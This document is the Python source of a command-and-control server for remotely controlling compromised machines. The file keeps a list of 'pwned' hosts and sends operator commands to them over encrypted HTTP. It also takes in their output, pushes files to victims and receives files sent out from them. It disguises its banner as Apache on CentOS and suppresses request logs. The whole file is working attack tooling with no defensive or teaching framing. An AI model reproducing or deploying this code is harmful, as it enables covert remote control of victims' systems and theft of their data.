#!/bin/bash

from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from os import path, mkdir
from urllib.parse import unquote_plus
from inputimeout import inputimeout, TimeoutOccurred
from encryption import cipher
from settings import (PORT, CMD_REQUEST, CWD_RESPONSE, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR,
                      FILE_REQUEST, FILE_SEND, STORAGE)


def get_new_client():
    global active_client, pwned_dict, pwned_id, cwd

    cwd = "~"

    if len(pwned_dict) == 1:
        print("Waiting for new connections.\n")
        pwned_dict = {}
        pwned_id = 0
        active_client = 1
    else:
        while True:
            for key, value in pwned_dict.items():
                if key != active_client:
                    print(key, "-", value)
            try:
                new_session = int(input("\nChoose a session number to make active: "))
            except ValueError:
                print("\nYou must choose a pwned id of one of the sessions shown on the screen\n")
                continue

            if new_session in pwned_dict and new_session != active_client:
                old_active_session = active_client
                active_client = new_session
                del pwned_dict[old_active_session]
                print(f"\nActive session is now: {pwned_dict[active_client]}")
                break
            else:
                print("\nYou must choose a pwned id of one of the sessions shown on the screen.\n")
                continue


class C2Handler(BaseHTTPRequestHandler):
    server_version = "Apache/2.4.58"
    sys_version = "(CentOS)"

    def do_GET(self):
        global active_client, client_account, client_hostname, pwned_dict, pwned_id

        if self.path.startswith(CMD_REQUEST):
            client = self.path.split(CMD_REQUEST)[1]

            client = cipher.decrypt(client.encode()).decode()

            client_account = client.split('@')[0]

            client_hostname = client.split('@')[1]

            if client not in pwned_dict.values():
                self.http_response(404)

                pwned_id += 1
                pwned_dict[pwned_id] = client

                print(f"{client_account}@{client_hostname} has been pwned!\n")

            elif client == pwned_dict[active_client]:

                if INPUT_TIMEOUT:
                    try:
                        command = inputimeout(prompt=f"{client_account}@{client_hostname}:{cwd}$ ",
                                              timeout=INPUT_TIMEOUT)
                    except TimeoutOccurred:
                        command = KEEP_ALIVE_CMD
                else:
                    command = input(f"{client_account}@{client_hostname}:{cwd}$ ")

                if command.startswith("server "):
                    if command.startswith("server show clients"):
                        print("Available pwned systems:")
                        print_last = None
                        for key, value in pwned_dict.items():
                            if key == active_client:
                                print_last = str(key) + " - " + value
                            else:
                                print(key, "-", value)
                        print("\nYour active session:", print_last, sep="\n")

                    elif command.startswith("server control"):
                        try:
                            possible_active_client = int(command.split()[2])
                            if possible_active_client in pwned_dict:
                                active_client = possible_active_client
                                print(f"Waiting for {pwned_dict[active_client]} to wake up.")
                            else:
                                raise ValueError
                        except (ValueError, IndexError):
                            print("You must enter a proper pwned id.  Use server show clients command.")

                    elif command.startswith("server exit"):
                        print("The c2 server has been shut down.")
                        server.shutdown()

                else:
                    try:
                        self.http_response(200)
                        self.wfile.write(cipher.encrypt(command.encode()))

                    except BrokenPipeError:
                        print(f"Lost connection to {pwned_dict[active_client]}.\n")
                        get_new_client()
                    else:
                        if command.startswith("client kill"):
                            get_new_client()

            else:
                self.http_response(404)

        elif self.path.startswith(FILE_REQUEST):
            filepath = self.path.split(FILE_REQUEST)[1]

            filepath = cipher.decrypt(filepath.encode()).decode()

            try:
                with open(f"{filepath}", "rb") as file_handle:
                    self.http_response(200)
                    self.wfile.write(cipher.encrypt(file_handle.read()))
            except (FileNotFoundError, OSError):
                print(f"{filepath} was not found on the c2 server.")
                self.http_response(404)

        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP GET.  Why?\n")

    def do_POST(self):
        if self.path == RESPONSE:
            print(self.handle_post_data())

        elif self.path == CWD_RESPONSE:
            global cwd
            cwd = self.handle_post_data()

        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP POST.  Why?\n")

    def do_PUT(self):
        if self.path.startswith(FILE_SEND + "/"):
            self.http_response(200)

            filename = self.path.split(FILE_SEND + "/")[1]

            filename = cipher.decrypt(filename.encode()).decode()

            incoming_file = STORAGE + "/" + filename

            file_length = int(self.headers['Content-Length'])

            with open(incoming_file, 'wb') as file_handle:
                file_handle.write(cipher.decrypt(self.rfile.read(file_length)))
            print(f"{incoming_file} has been written to the c2 server.")

        else:
            print(f"{self.client_address[0]} just accessed {self.path} on our c2 server using HTTP PUT.  Why?\n")

    def handle_post_data(self):
        self.http_response(200)

        content_length = int(self.headers.get("Content-Length"))

        client_data = self.rfile.read(content_length)

        client_data = client_data.decode()

        client_data = client_data.replace(f"{RESPONSE_KEY}=", "", 1)

        client_data = unquote_plus(client_data)

        client_data = cipher.decrypt(client_data.encode()).decode()

        return client_data

    def http_response(self, code: int):
        self.send_response(code)
        self.end_headers()

    def log_request(self, code="-", size="-"):
        return


active_client = 1

cwd = "~"

client_account = ""

client_hostname = ""

pwned_id = 0

pwned_dict = {}

if not path.isdir(STORAGE):
    mkdir(STORAGE)

server = ThreadingHTTPServer((BIND_ADDR, PORT), C2Handler)

server.serve_forever()
